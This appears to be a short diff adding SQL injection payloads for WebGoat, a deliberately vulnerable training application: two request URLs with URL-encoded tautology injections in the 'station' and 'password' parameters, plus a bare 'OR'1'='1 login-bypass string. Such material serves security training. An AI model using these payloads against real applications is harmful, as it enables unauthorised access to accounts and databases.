@@ -1,0 +1,5 @@
+/WebGoat/attack?Screen=298&menu=1100&station=%20101%20OR%201%3d1&SUBMIT=Go!
+/WebGoat/attack?Screen=283&menu=1100&employee_id=101&password=AAa%20'OR'1'%3d'1&action=LoginS
+
+
+'OR'1'='1
